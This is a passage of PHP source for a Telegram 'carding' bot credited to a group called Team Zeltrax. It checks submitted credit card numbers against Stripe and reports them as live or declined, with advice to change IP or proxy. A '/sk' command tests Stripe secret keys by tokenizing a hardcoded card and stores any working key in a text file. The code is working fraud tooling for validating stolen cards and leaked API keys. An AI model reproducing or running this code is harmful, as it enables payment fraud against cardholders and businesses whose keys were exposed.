sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, '"cvc_check":"unavailable"')) || (strpos($result, '"cvc_check": "unchecked"')) || (strpos($result, '"cvc_check": "fail"'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif ((strpos($result, "Your card was declined.")) || (strpos($result, 'The card was declined.'))){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:</b> <b>『 ★ Card Declined ★ 』</b>%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
elseif(!$result){
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:'.$result.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}else{
sendMessage($chatId, '<b>CARD:</b> <code>'.$lista.'</code>%0A<b>STATUS:</b> <b>❌DECLINED</b>%0A<b>RESPONSE:'.$result.'%0A<b>Country:</b> '.$name.' '.$emoji.'%0A<b>Gateway:</b> <b>STRIPE INTENT</b>%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>', $message_id);
}
curl_close($ch);
}

//////////=========[Sk Key Check Command]=========//////////

elseif ((strpos($message, "!sk") === 0)||(strpos($message, "/sk") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<b>KEY:</b> <code>$sec</code>%0A<b>REASON:</b> EXPIRED KEY%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<b>KEY:</b> <code>$sec</code>%0A<b>REASON:</b> INVALID KEY%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b> DEAD KEY</b>%0A<b>KEY:</b> <code>$sec</code>%0A<b>REASON:</b> Testmode Charges Only%0A%0A<b>Bot by -- Muhammad Rafli Aufa</b>", $message_id);
}else{
    fwrite(fopen('ani_sk_live_storage.txt', 'a'), $sec.""."\r\n");
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<b>KEY:</b> <code>$sec</code>%0A<b>RESPONSE:</b> SK LIVE!!%0A%0A<b>Bot by --» Muhammad Rafli Aufa</b>", $message_id);
}}


////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message, $message_id){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};

////////////////=============[Team Zeltrax]=============////////////////
////////==========[Join @ZeltraxRockz and @ZeltraxChat for more]==========////////

?>
